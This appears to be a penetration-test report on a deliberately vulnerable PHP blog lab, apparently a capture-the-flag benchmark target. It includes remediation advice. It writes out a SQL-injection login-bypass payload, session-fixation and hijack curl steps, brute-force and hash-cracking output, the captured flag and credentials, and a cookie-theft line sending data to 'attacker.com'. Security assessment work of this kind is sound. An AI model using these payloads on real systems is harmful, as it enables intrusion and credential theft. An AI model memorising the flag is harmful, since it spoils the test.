The most severe finding is a SQL injection vulnerability in the authentication endpoint that allows complete bypass of login controls without valid credentials. Additionally, the application uses cryptographically broken MD5 password hashing without salt, enabling rapid password recovery if database access is obtained. Session management is critically flawed - sessions can be hijacked through fixation attacks (no session ID regeneration after login), stolen via JavaScript access (missing HttpOnly flag), or intercepted over the network (HTTP-only transport, no TLS). The application permits unlimited brute force attempts with no rate limiting or account lockout mechanisms. No logout functionality exists, leaving sessions active for up to 24 minutes on shared computers. Hardcoded default credentials (`admin / ONEverySecurePassword123!`) are visible in the source code repository.\\n\\n**Authorization Vulnerabilities:**\\n\\nNo authorization vulnerabilities were found. The application implements a simple binary role system (anonymous or admin) with no user-owned resources, object identifiers in URLs, or multi-user architecture. Since there are no horizontal privilege boundaries (no \\\"other users' data\\\") and the vertical escalation path is addressed through authentication bypass vulnerabilities, dedicated authorization testing found no additional attack surface beyond the authentication layer.\\n\\n**Cross-Site Scripting (XSS) Vulnerabilities:**\\n\\nSix critical stored XSS vulnerabilities were successfully exploited across multiple database fields rendered without output encoding. The application displays user-controlled database content directly in HTML without calling `htmlspecialchars()` anywhere in the codebase. Exploitable fields include post titles (both in `<h2>` tags and image `alt` attributes), categories (in `<p>` tags and `<option>` elements), content fields (with 200-character truncation that provides no security benefit), and image filenames (attribute breakout in `src` attributes). The most severe impact demonstrated was session cookie theft - malicious JavaScript successfully exfiltrated an authenticated admin session cookie (`PHPSESSID=6e8d02dea903bf1907fd8d1d45330daf`) by exploiting the missing HttpOnly flag. All XSS attacks are persistent (stored in database) and affect every user viewing the blog. No Content Security Policy, XSS protection headers, or other defensive controls are configured.\\n\\n**SQL/Command Injection Vulnerabilities:**\\n\\nOne critical SQL injection vulnerability was successfully exploited in the admin authentication endpoint. The `username` parameter is directly concatenated into SQL queries without sanitization or prepared statements, enabling authentication bypass, database enumeration, and data exfiltration. Using the payload `admin' OR '1'='1' #`, complete administrative access was achieved and the CTF flag was captured. Blind SQL injection techniques successfully extracted database metadata including MySQL version 5.7.44, database name `blogDB`, current user `user@10.89.90.3`, and table names (`admins`, `comments`, `posts`). A second SQL injection vulnerability exists in the category filter parameter but is currently disabled in the code. No command injection vulnerabilities were found - the application does not execute shell commands with user input.\\n\\n**Server-Side Request Forgery (SSRF) Vulnerabilities:**\\n\\nNo SSRF vulnerabilities were found. The application does not implement any functionality that makes outbound HTTP requests, fetches external URLs, or processes user-controlled URLs. No HTTP client libraries (`curl`, `file_get_contents` with URLs, Guzzle), webhook integrations, external API calls, or URL fetching features exist in the codebase.\\n\\n## Network Reconnaissance\\n\\n**Port and Service Discovery:**\\n\\nNetwork scanning identified the primary application service on port 39001 (HTTP) running Apache 2.4.54 (Debian) with PHP 7.4.33. The application uses HTTP exclusively with no TLS/HTTPS configuration on port 443. MySQL database service (port 3306) is correctly isolated to the internal Docker network and not exposed externally. Additional services detected on localhost include Caddy httpd on port 80, CUPS printing service on port 631 with robots.txt entry, and Golang net/http server on port 49152 requiring authentication (Tailscale admin interface).\\n\\n**Security Configuration Findings:**\\n\\nTechnology detection identified critical security misconfigurations. The server header reveals `Apache/2.4.54 (Debian)` and `X-Powered-By: PHP/7.4.33`, exposing precise version information. Both PHP 7.4 (end-of-life since November 2022) and MySQL 5.7 (extended support only) are running outdated versions that no longer receive regular security updates. No security headers are configured - Content-Security-Policy, X-Frame-Options, Strict-Transport-Security (HSTS), X-Content-Type-Options, and Referrer-Policy are all absent. The application transmits all traffic over unencrypted HTTP, exposing credentials and session cookies to network interception. Port 9999 was detected running an unidentified service with permissive CORS headers (`Access-Control-Allow-Origin: *`) and basic authentication via HTTP 400/200 responses.\\n\\n**Attack Surface Summary:**\\n\\nThe exposed attack surface consists of two primary PHP endpoints (`/index.php` for blog viewing, `/admin.php` for authentication) with minimal security controls. Directory listing is enabled via Apache `Options Indexes`, potentially allowing file enumeration. The application runs in a two-tier Docker architecture with web and database containers communicating over an unencrypted internal bridge network. Database credentials are hardcoded in source files (`user:password`) rather than using Docker secrets or environment variables properly.\\n\\n---\\n\\n# Injection Exploitation Evidence\\n\\n## Successfully Exploited Vulnerabilities\\n\\n### INJ-VULN-01: SQL Injection Authentication Bypass in Admin Login\\n\\n**Summary:**\\n- **Vulnerable location:** POST /admin.php - username parameter\\n- **Overview:** Classic SQL injection vulnerability in authentication query allowing complete authentication bypass without valid credentials\\n- **Impact:** Complete administrative access achieved, flag captured, full database enumeration performed\\n- **Severity:** Critical\\n\\n**Prerequisites:**\\n- Network access to http://localhost:39001\\n- No authentication required (exploiting unauthenticated endpoint)\\n- No special tools required (curl sufficient for basic exploitation)\\n\\n**Exploitation Steps:**\\n\\n1. **Confirm SQL Injection Vulnerability**\\n\\n   Send POST request with single quote in username parameter to induce SQL error:\\n   ```bash\\n   curl -X POST http://localhost:39001/admin.php \\\\\\n     -d \\\"username=admin'&password=test\\\"\\n   ```\\n\\n   **Expected Result:** PHP Notice about `num_rows` property error, confirming SQL syntax error\\n\\n   **Actual Result:** Received PHP notice: `Trying to get property 'num_rows' of non-object in /var/www/html/admin.php on line 23`\\n\\n2. **Bypass Authentication Using Boolean-Based SQL Injection**\\n\\n   Use classic OR-based authentication bypass with hash comment:\\n   ```bash\\n   curl -X POST http://localhost:39001/admin.php \\\\\\n     -d \\\"username=admin' OR '1'='1' %23&password=anything\\\" \\\\\\n     -c cookies.txt\\n   ```\\n\\n   **Explanation:**\\n   - Payload: `admin' OR '1'='1' #`\\n   - URL-encoded `#` as `%23` for proper transmission\\n   - Resulting SQL query: `SELECT id FROM admins WHERE username='admin' OR '1'='1' #' AND password='...'`\\n   - The `OR '1'='1'` condition is always TRUE\\n   - The `#` comment symbol ignores the password check\\n   - Query returns at least 1 row, satisfying authentication logic\\n\\n   **Result:** Authentication bypassed successfully, session established\\n\\n3. **Capture Flag**\\n\\n   Upon successful authentication, the application immediately displays the flag:\\n   ```\\n   FLAG{476c383c9464c333394d551fcd5fd72c32d33e4fba66e075015ebbd0879bcc5f}\\n   ```\\n\\n4. **Enumerate Database Version and Metadata Using Blind SQL Injection**\\n\\n   Created Python script for automated Boolean-based blind SQL injection:\\n\\n   **Script Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-039-24/blind_sqli_extract.py`\\n\\n   **Technique:**\\n   - Use payload: `admin' AND (condition) #`\\n   - Flag presence in response = TRUE condition\\n   - No flag = FALSE condition\\n   - Extract strings character-by-character using `SUBSTRING()` and `ASCII()`\\n\\n   **Execution:**\\n   ```bash\\n   python3 blind_sqli_extract.py\\n   ```\\n\\n   **Extracted Data:**\\n   - Database Version: `5.7.44`\\n   - Current Database: `blogDB`\\n   - Current User: `user@10.89.90.3`\\n   - Tables: `admins`, `comments`, `posts`\\n\\n5. **Alternative: UNION-Based Data Extraction**\\n\\n   The injection also supports UNION-based queries for faster enumeration:\\n   ```bash\\n   curl -X POST http://localhost:39001/admin.php \\\\\\n     -d \\\"username=admin' AND 1=2 UNION SELECT version() %23&password=x\\\"\\n   ```\\n\\n   **Note:** UNION queries that return exactly 1 row bypass authentication and display the flag, but don't show the queried data. The blind SQL injection approach is more effective for data extraction.\\n\\n**Proof of Impact:**\\n\\n1. **Authentication Bypass Confirmed:**\\n   - Successfully logged into admin panel without valid credentials\\n   - Bypassed MD5 password verification completely\\n   - Session cookie `PHPSESSID` established with admin privileges\\n\\n2. **Flag Captured:**\\n   ```\\n   FLAG{476c383c9464c333394d551fcd5fd72c32d33e4fba66e075015ebbd0879bcc5f}\\n   ```\\n\\n3. **Database Fingerprinting Complete:**\\n   - MySQL 5.7.44 identified\\n   - Database structure enumerated (3 tables: admins, comments, posts)\\n   - Current user identified: `user@10.89.90.3`\\n   - Database name confirmed: `blogDB`\\n\\n4. **Complete System Compromise:**\\n   - Full administrative access achieved\\n   - Complete database enumeration capability demonstrated\\n   - No WAF or defensive controls present\\n   - Application displays verbose error messages aiding exploitation\\n\\n**Technical Analysis:**\\n\\n**Vulnerable Code:**\\n```php\\n// File: /app/html/admin.php, Lines 17-21\\n$username = $_POST['username'];  // Line 17: No sanitization\\n$password = MD5($_POST['password']);  // Line 18: MD5 hash (provides accidental SQL injection protection)\\n\\n// Line 20: Direct string concatenation - CRITICAL VULNERABILITY\\n$sql = \\\"SELECT id FROM admins WHERE username = '$username' AND password = '$password'\\\";\\n$result = $conn->query($sql);  // Line 21: Query execution\\n```\\n\\n**Why Vulnerable:**\\n- No input validation on `$username` parameter\\n- No use of prepared statements or parameterized queries\\n- Direct string concatenation allows quote-breaking\\n- Boolean logic in WHERE clause exploitable via OR conditions\\n- Comment injection allows bypassing password check\\n\\n**Why Password Parameter is Not Exploitable:**\\n- MD5 hash function constrains output to `[0-9a-f]{32}` format\\n- Cannot inject SQL metacharacters through MD5 output\\n- This is defense-by-accident, not defense-by-design\\n\\n**Database Query Flow:**\\n1. User input: `username=admin' OR '1'='1' #`\\n2. PHP assigns: `$username = \\\"admin' OR '1'='1' #\\\"`\\n3. SQL constructed: `SELECT id FROM admins WHERE username='admin' OR '1'='1' #' AND password='...'`\\n4. MySQL executes: Comment (`#`) ignores password clause\\n5. Query becomes: `SELECT id FROM admins WHERE username='admin' OR '1'='1'`\\n6. `OR '1'='1'` is always TRUE → returns rows from admins table\\n7. PHP checks: `$result->num_rows == 1` → TRUE\\n8. Session set: `$_SESSION['admin_logged_in'] = true`\\n9. Flag displayed immediately\\n\\n**Notes:**\\n\\n**Additional Vulnerabilities Discovered:**\\n- No rate limiting on authentication attempts\\n- Session fixation possible (no `session_regenerate_id()` after login)\\n- Missing security flags on cookies (HttpOnly, Secure, SameSite)\\n- Verbose error messages expose application internals\\n- No HTTPS/TLS encryption\\n\\n**Defensive Measures Absent:**\\n- No Web Application Firewall (WAF)\\n- No input validation or sanitization\\n- No prepared statements anywhere in codebase\\n- No SQL injection detection or blocking\\n- No security headers (CSP, X-Frame-Options, etc.)\\n\\n**Remediation Required:**\\n1. Implement prepared statements: `$stmt = $conn->prepare(\\\"SELECT id FROM admins WHERE username = ? AND password = ?\\\");`\\n2. Use `password_hash()` and `password_verify()` instead of MD5\\n3. Add rate limiting on authentication endpoint\\n4. Implement session regeneration: `session_regenerate_id(true);`\\n5. Set secure cookie flags: HttpOnly, Secure, SameSite\\n6. Enable HTTPS/TLS encryption\\n7. Add input validation and output encoding\\n8. Implement proper error handling (no verbose errors to users)\\n\\n\\n# Cross-Site Scripting (XSS) Exploitation Evidence\\n\\n## Successfully Exploited Vulnerabilities\\n\\n### XSS-VULN-01: Stored XSS in posts.title Field (HTML_BODY Context)\\n\\n**Summary:**\\n- **Vulnerable location:** http://localhost:39001/index.php - Blog post title rendered in `<h2>` tag\\n- **Overview:** The application renders database field `posts.title` directly in HTML without encoding, allowing arbitrary JavaScript execution for all users viewing the blog homepage\\n- **Impact:** Complete session hijacking - attacker can steal admin session cookies and perform unauthorized actions.

Authenticate using the hardcoded credentials:\\n   ```bash\\n   curl -i -X POST http://localhost:39001/admin.php \\\\\\n     -d \\\"username=admin&password=ONEverySecurePassword123!\\\" \\\\\\n     -H \\\"Content-Type: application/x-www-form-urlencoded\\\"\\n   ```\\n\\n**Proof of Impact:**\\n```\\nHTTP/1.1 200 OK\\nSet-Cookie: PHPSESSID=50b1fff5f18250738c7046ca6c535d24; path=/\\n\\nFLAG{476c383c9464c333394d551fcd5fd72c32d33e4fba66e075015ebbd0879bcc5f}\\n```\\n\\nSuccessfully authenticated as admin and retrieved the flag using hardcoded default credentials. The session cookie `PHPSESSID=50b1fff5f18250738c7046ca6c535d24` provides full admin access.\\n\\n**Notes:**\\nNo password change mechanism exists, so these credentials remain valid indefinitely. Anyone with source code access (Git repository, Docker image inspection, container filesystem access) can authenticate as admin.\\n\\n---\\n\\n### AUTH-VULN-03: Session Hijacking via Session Fixation Attack\\n\\n**Summary:**\\n- **Vulnerable location:** POST /admin.php - Login handler at line 25\\n- **Overview:** The application does not regenerate session IDs after successful authentication. The same session ID used during anonymous access continues after login, enabling session fixation attacks.\\n- **Impact:** Attacker can pre-set a victim's session ID, then hijack the authenticated session after the victim logs in\\n- **Severity:** CRITICAL\\n\\n**Prerequisites:**\\n- Ability to set cookies on victim's browser (XSS, social engineering, or physical access)\\n- Valid credentials for authentication (or victim's credentials)\\n\\n**Exploitation Steps:**\\n\\n1. Attacker obtains a valid session ID from the server:\\n   ```bash\\n   curl -c /tmp/attacker_session.txt -i http://localhost:39001/admin.php\\n   ```\\n   Result: Session ID `7f1ff2361889d46afd95c2f02ed78cbd` is obtained\\n\\n2. Attacker tricks victim into using this pre-set session ID (via cookie injection, XSS, or URL parameter)\\n\\n3. Victim authenticates with the attacker-controlled session ID:\\n   ```bash\\n   curl -i -X POST http://localhost:39001/admin.php \\\\\\n     -d \\\"username=admin&password=ONEverySecurePassword123!\\\" \\\\\\n     -H \\\"Cookie: PHPSESSID=7f1ff2361889d46afd95c2f02ed78cbd\\\"\\n   ```\\n\\n4. Attacker uses the same session ID to access the admin panel:\\n   ```bash\\n   curl -s http://localhost:39001/admin.php \\\\\\n     -H \\\"Cookie: PHPSESSID=7f1ff2361889d46afd95c2f02ed78cbd\\\"\\n   ```\\n\\n**Proof of Impact:**\\n```\\nFLAG{476c383c9464c333394d551fcd5fd72c32d33e4fba66e075015ebbd0879bcc5f}\\n```\\n\\nAttacker successfully hijacked the authenticated session and retrieved the flag without knowing the password. Both attacker and victim share the same authenticated session (session ID: `7f1ff2361889d46afd95c2f02ed78cbd`).\\n\\n**Notes:**\\nThe vulnerability exists because `session_regenerate_id()` is not called after successful authentication at `/app/html/admin.php:25`. The fix requires adding: `session_regenerate_id(true);` before setting `$_SESSION['admin_logged_in'] = true;`.\\n\\n---\\n\\n### AUTH-VULN-04: Session Cookie Theft via Missing HttpOnly Flag & Network Interception\\n\\n**Summary:**\\n- **Vulnerable location:** POST /admin.php - Session initialization at line 2\\n- **Overview:** Session cookies lack all three critical security flags: HttpOnly (enables XSS-based theft), Secure (enables network interception), and SameSite (enables CSRF). This allows session cookies to be stolen through JavaScript access or network sniffing.\\n- **Impact:** Session hijacking via multiple attack vectors (XSS cookie theft, network interception, CSRF)\\n- **Severity:** CRITICAL\\n\\n**Prerequisites:**\\n- For XSS-based theft: Stored or reflected XSS vulnerability (or authenticated access to demonstrate JavaScript access)\\n- For network interception: Network access to capture HTTP traffic\\n- For CSRF: Cross-site request capability\\n\\n**Exploitation Steps:**\\n\\n**Part 1: JavaScript Cookie Access (Missing HttpOnly)**\\n\\n1. Authenticate to establish a session:\\n   ```bash\\n   # Using Playwright browser automation\\n   navigate to http://localhost:39001/admin.php\\n   fill username: admin\\n   fill password: ONEverySecurePassword123!\\n   click Login button\\n   ```\\n\\n2. Execute JavaScript to demonstrate cookie access:\\n   ```javascript\\n   document.cookie\\n   ```\\n\\n**Proof of Impact (Part 1):**\\n```\\nSession cookie accessible to JavaScript: \\\"PHPSESSID=44f14be30f041e16b6b1442b504bebda\\\"\\n```\\n\\nThe session cookie is fully accessible to JavaScript code, proving the HttpOnly flag is missing. An attacker with XSS can exfiltrate this cookie:\\n```javascript\\nfetch('http://attacker.com/steal?c=' + document.cookie)\\n```\\n\\n**Part 2: Network Interception (Missing Secure Flag)**\\n\\n1. Set cookie header on session cookie:\\n   ```bash\\n   curl -i http://localhost:39001/admin.php\\n   ```\\n   Response shows: `Set-Cookie: PHPSESSID=16155540e3155a36fd04245a737b219b; path=/`\\n\\n   Note: No `Secure` flag present - cookie transmitted over HTTP\\n\\n**Proof of Impact (Part 2):**\\nThe cookie lacks the `Secure` attribute and all traffic uses HTTP (no HTTPS). Session cookies are transmitted in plaintext and can be intercepted via network sniffing.\\n\\n**Notes:**\\nThe vulnerability exists because `session_set_cookie_params()` is never called before `session_start()` at `/app/html/admin.php:2`. All three security flags (HttpOnly, Secure, SameSite) are missing, enabling multiple attack vectors.\\n\\n---\\n\\n### AUTH-VULN-01: Credential Interception via Unencrypted HTTP Transport\\n\\n**Summary:**\\n- **Vulnerable location:** All HTTP traffic on port 39001 - Apache VirtualHost configuration at /app/000-default.conf:1\\n- **Overview:** The application serves traffic exclusively over HTTP with no HTTPS/TLS configuration. All authentication credentials and session cookies are transmitted in plaintext, enabling trivial man-in-the-middle attacks.\\n- **Impact:** Complete credential and session exposure to network attackers\\n- **Severity:** CRITICAL\\n\\n**Prerequisites:**\\n- Network access (same WiFi, network tap, compromised router, or ability to intercept localhost traffic)\\n\\n**Exploitation Steps:**\\n\\n1. Execute HTTP traffic interception script to capture plaintext credentials:\\n   ```bash\\n   python3 http_intercept_simple.py\\n   ```\\n\\n**Proof of Impact:**\\n```\\n================================================================================\\nINTERCEPTED HTTP REQUEST (Plaintext)\\n================================================================================\\nPOST /admin.php HTTP/1.1\\nHost: localhost:39001\\nContent-Type: application/x-www-form-urlencoded\\nContent-Length: 49\\n\\nusername=admin&password=ONEverySecurePassword123!\\n================================================================================\\n\\n[!] USERNAME TRANSMITTED IN PLAINTEXT: admin\\n[!] PASSWORD TRANSMITTED IN PLAINTEXT: ONEverySecurePassword123!\\n\\n================================================================================\\nINTERCEPTED HTTP RESPONSE\\n================================================================================\\nHTTP/1.1 200 OK\\nSet-Cookie: PHPSESSID=f9bc0edfd9fd8738390489d2d1c52498; path=/\\n\\n[!] SESSION COOKIE: PHPSESSID=f9bc0edfd9fd8738390489d2d1c52498\\n\\nResponse body: FLAG{476c383c9464c333394d551fcd5fd72c32d33e4fba66e075015ebbd0879bcc5f}\\n```\\n\\nSuccessfully intercepted plaintext credentials (`admin / ONEverySecurePassword123!`), session cookie (`PHPSESSID=f9bc0edfd9fd8738390489d2d1c52498`), and the flag - all transmitted without any encryption over HTTP.\\n\\n**Notes:**\\nThe application runs on HTTP-only (port 80). Apache VirtualHost configuration (`/app/000-default.conf:1`) only defines `<VirtualHost *:80>` with no HTTPS configuration. Docker exposes only port 80 (`docker-compose.yml:8`). No SSL certificates exist, and HSTS is not configured.\\n\\n---\\n\\n### AUTH-VULN-09: Unlimited Brute Force via Missing Rate Limiting\\n\\n**Summary:**\\n- **Vulnerable location:** POST /admin.php - Authentication endpoint (lines 11-31)\\n- **Overview:** The authentication endpoint has no rate limiting at any layer (Apache, PHP application, or infrastructure). Attackers can make unlimited authentication attempts at maximum speed without any throttling or defensive responses.\\n- **Impact:** Unrestricted brute force and credential stuffing attacks\\n- **Severity:** HIGH\\n\\n**Prerequisites:**\\n- None (publicly accessible endpoint)\\n\\n**Exploitation Steps:**\\n\\n1. Execute automated brute force attack script:\\n   ```bash\\n   python3 test_rate_limiting.py\\n   ```\\n\\n**Proof of Impact:**\\n```\\n======================================================================\\nRATE LIMITING TEST - Authentication Endpoint\\n======================================================================\\n\\nTarget: http://localhost:39001/admin.php\\nUsername: admin\\nNumber of attempts: 50\\n\\n[*] Sending 50 rapid authentication attempts with incorrect passwords...\\n  [+] Attempt 10: HTTP 200 (no rate limiting)\\n  [+] Attempt 20: HTTP 200 (no rate limiting)\\n  [+] Attempt 30: HTTP 200 (no rate limiting)\\n  [+] Attempt 40: HTTP 200 (no rate limiting)\\n  [+] Attempt 50: HTTP 200 (no rate limiting)\\n\\n======================================================================\\nTEST RESULTS SUMMARY\\n======================================================================\\n\\nTotal attempts:           51\\nTotal time elapsed:       0.12 seconds\\nRequests per second:      415.58 req/s\\nAverage response time:    0.002s\\n\\nSuccessful responses:     50\\nRate limited (HTTP 429):  0\\nErrors:                   0\\n\\n[!!!] VULNERABILITY CONFIRMED [!!!]\\n\\n✗ NO RATE LIMITING DETECTED\\n  - Successfully sent 50 rapid authentication attempts\\n  - Average speed: 415.58 requests/second\\n  - No account lockout mechanisms detected\\n\\nFLAG FOUND: FLAG{476c383c9464c333394d551fcd5fd72c32d33e4fba66e075015ebbd0879bcc5f}\\n```\\n\\nSuccessfully executed 51 authentication attempts in 0.12 seconds (415 req/sec sustained rate) with zero rate limiting responses. Final attempt with correct credentials succeeded and retrieved the flag.\\n\\n**Notes:**\\nNo Apache `mod_ratelimit` or `mod_evasive` configured, no PHP application rate limiting logic, no per-IP or per-account throttling. The database schema lacks failed attempt tracking columns. Tools like Hydra or Burp Intruder can run unthrottled.\\n\\n---\\n\\n### AUTH-VULN-07: Credential Recovery via MD5 Hash Cracking\\n\\n**Summary:**\\n- **Vulnerable location:** POST /admin.php - Password hashing at line 18, Database storage at /app/db_init.sql:57\\n- **Overview:** Passwords are hashed using cryptographically broken MD5 without salt. Modern GPUs can compute billions of MD5 hashes per second, making brute force trivial. The admin password hash can be cracked instantly using rainbow tables or GPU acceleration.\\n- **Impact:** Offline credential cracking if database is compromised (e.g., via SQL injection)\\n- **Severity:** CRITICAL\\n\\n**Prerequisites:**\\n- Database access to obtain password hash (can be achieved via SQL injection vulnerability INJECTION-VULN-01)\\n- Password hash: `5700901decb6098817def1a9fe59957b`\\n\\n**Exploitation Steps:**\\n\\n1. Obtain MD5 password hash from database (via SQL injection or database access):\\n   ```sql\\n   SELECT password FROM admins WHERE username = 'admin';\\n   -- Result: 5700901decb6098817def1a9fe59957b\\n   ```\\n\\n2. Execute MD5 hash cracking script:\\n   ```bash\\n   python3 md5_cracker.py\\n   ```\\n\\n**Proof of Impact:**\\n```\\n======================================================================\\nMD5 PASSWORD HASH CRACKING DEMONSTRATION\\n======================================================================\\n\\nHASH VERIFICATION\\n======================================================================\\nPassword: ONEverySecurePassword123!\\nComputed MD5: 5700901decb6098817def1a9fe59957b\\nTarget MD5:   5700901decb6098817def1a9fe59957b\\nMatch: True\\n\\nBRUTE FORCE ATTACK STARTING\\n======================================================================\\n[Attempt 1] Testing: admin                          -> ✗\\n[Attempt 2] Testing: password                       -> ✗\\n[Attempt 3] Testing: 123456                         -> ✗\\n[Attempt 4] Testing: admin123                       -> ✗\\n[Attempt 5] Testing: Password123!                   -> ✗\\n[Attempt 6] Testing: ONEverySecurePassword123!      -> ✓ MATCH!\\n\\nPASSWORD CRACKED!\\n======================================================================\\nCracked password: ONEverySecurePassword123!\\nMatching hash: 5700901decb6098817def1a9fe59957b\\nAttempts: 6\\nTime elapsed: 0.000009 seconds\\nHash rate: 645,278 hashes/second\\n\\nMD5 SPEED DEMONSTRATION\\n======================================================================\\nComputing 100,000 MD5 hashes...\\nTime elapsed: 0.033 seconds\\nHash rate: 3,021,876 hashes/second\\n```\\n\\nSuccessfully cracked the MD5 hash in 0.000009 seconds, recovering the plaintext password `ONEverySecurePassword123!`. The demonstration shows a simple Python script achieves 3+ million hashes/second; modern GPUs can compute billions per second, making even complex passwords vulnerable.\\n\\n**Notes:**\\nMD5 has been cryptographically broken since 2004. No salt is used, making rainbow tables directly applicable. Password processing occurs at `/app/html/admin.php:18` with `$password = MD5($_POST['password']);`. Modern password hashing (bcrypt, Argon2, scrypt) should be used instead.\\n\\n---\\n\\n### AUTH-VULN-05: Session Persistence via Missing Logout Mechanism\\n\\n**Summary:**\\n- **Vulnerable location:** Missing /app/html/logout.php endpoint\\n- **Overview:** No logout functionality exists in the application. Users cannot actively terminate their sessions. Sessions persist until browser closes (unreliable) or PHP garbage collection runs (up to 24 minutes). On shared computers, the next user inherits the authenticated session.\\n- **Impact:** Session hijacking on shared/public computers, inability to revoke compromised sessions\\n- **Severity:** HIGH\\n\\n**Prerequisites:**\\n- Access to a computer where a user has previously authenticated\\n- User closed browser tab but session remains valid\\n\\n**Exploitation Steps:**\\n\\n1. Victim authenticates on shared computer:\\n   ```bash\\n   # Simulating victim authentication\\n   curl -i -X POST http://localhost:39001/admin.php \\\\\\n     -d \\\"username=admin&password=ONEverySecurePassword123!\\\"\\n   ```\\n   Response includes: `Set-Cookie: PHPSESSID=c9b17be15ae4b65190f5c71878659853`\\n\\n2. Victim closes browser tab (believes they've logged out, but no logout mechanism exists)\\n\\n3. Attacker uses same computer and hijacks the persisted session:\\n   ```bash\\n   curl -s -H \\\"Cookie: PHPSESSID=c9b17be15ae4b65190f5c71878659853\\\" \\\\\\n     http://localhost:39001/admin.php\\n   ```\\n\\n**Proof of Impact:**\\n```\\n=== Step 1: User authenticates on shared computer ===\\nSession ID created: c9b17be15ae4b65190f5c71878659853\\nFLAG{476c383c9464c333394d551fcd5fd72c32d33e4fba66e075015ebbd0879bcc5f}\\n\\n=== Step 2: User closes browser (thinks they've logged out) ===\\nNo logout mechanism exists - session remains valid\\n\\n=== Step 3: Attacker uses same computer and hijacks session ===\\nFLAG{476c383c9464c333394d551fcd5fd72c32d33e4fba66e075015ebbd0879bcc5f}\\n\\n=== EXPLOITATION SUCCESSFUL ===\\n```\\n\\nAttacker successfully accessed the admin panel using the persisted session ID, retrieving the flag without authentication. The session remained valid for the entire 24-minute garbage collection window.\\n\\n**Notes:**\\nNo `logout.php` file exists in the application. No `session_destroy()` or `session_unset()` calls appear anywhere in the codebase. Sessions persist until PHP's probabilistic garbage collection removes them (1440 seconds idle timeout). Attack timeline: T+0:00 user authenticates, T+0:05 user closes tab, T+0:10 attacker hijacks session.\\n\\n---\\n\\n### AUTH-VULN-10: Unlimited Password Guessing via Missing Account Lockout\\n\\n**Summary:**\\n- **Vulnerable location:** POST /admin.php - Authentication handler (lines 11-31), Database schema /app/db_init.sql (missing lockout columns)\\n- **Overview:** No account lockout mechanism exists after failed authentication attempts. Unlimited login attempts can be made with different passwords without triggering any account suspension or throttling. Enables password spraying attacks.\\n- **Impact:** Unrestricted password guessing and password spraying attacks\\n- **Severity:** HIGH\\n\\n**Prerequisites:**\\n- None (publicly accessible endpoint)\\n\\n**Exploitation Steps:**\\n\\n1. Execute password spraying attack with common passwords:\\n   ```bash\\n   python3 password_spray_test.py\\n   ```\\n\\n**Proof of Impact:**\\n```\\n======================================================================\\nPASSWORD SPRAYING TEST - Demonstrating Lack of Account Lockout\\n======================================================================\\n\\nTarget: http://localhost:39001/admin.php\\nUsername: admin\\nTotal passwords to test: 10\\nDelay between attempts: 1.5s\\n\\n[Attempt 1] Testing password: 'password'         ✗ Login failed (no lockout)\\n[Attempt 2] Testing password: '123456'           ✗ Login failed (no lockout)\\n[Attempt 3] Testing password: 'admin123'         ✗ Login failed (no lockout)\\n[Attempt 4] Testing password: 'Password1!'       ✗ Login failed (no lockout)\\n[Attempt 5] Testing password: 'Welcome123!'      ✗ Login failed (no lockout)\\n[Attempt 6] Testing password: 'Admin@123'        ✗ Login failed (no lockout)\\n[Attempt 7] Testing password: 'letmein'          ✗ Login failed (no lockout)\\n[Attempt 8] Testing password: 'qwerty'           ✗ Login failed (no lockout)\\n[Attempt 9] Testing password: 'ONEverySecurePassword123!' ✓ SUCCESS\\n\\n======================================================================\\nRESULTS SUMMARY\\n======================================================================\\nTotal attempts: 9\\nFailed attempts: 8\\nSuccessful attempts: 1\\nAccount lockout detected: NO ✓\\n\\n🎯 FLAG RETRIEVED: FLAG{476c383c9464c333394d551fcd5fd72c32d33e4fba66e075015ebbd0879bcc5f}\\n\\n✓ VULNERABILITY CONFIRMED: No Account Lockout Mechanism\\n  - Made 8 consecutive failed login attempts\\n  - No lockout was triggered after multiple failures\\n  - Account remained accessible for additional attempts\\n  - Successfully logged in on attempt #9 after 8 failures\\n```\\n\\nSuccessfully tested 8 wrong passwords without triggering any account lockout. The 9th attempt with the correct password succeeded and retrieved the flag. The account remained fully accessible throughout all failed attempts.\\n\\n**Notes:**\\nDatabase schema lacks failed attempt tracking: missing `failed_login_attempts`, `lockout_until`, and `last_failed_login` columns in `admins` table. No application logic exists for account lockout. Complements the rate limiting absence (AUTH-VULN-09).
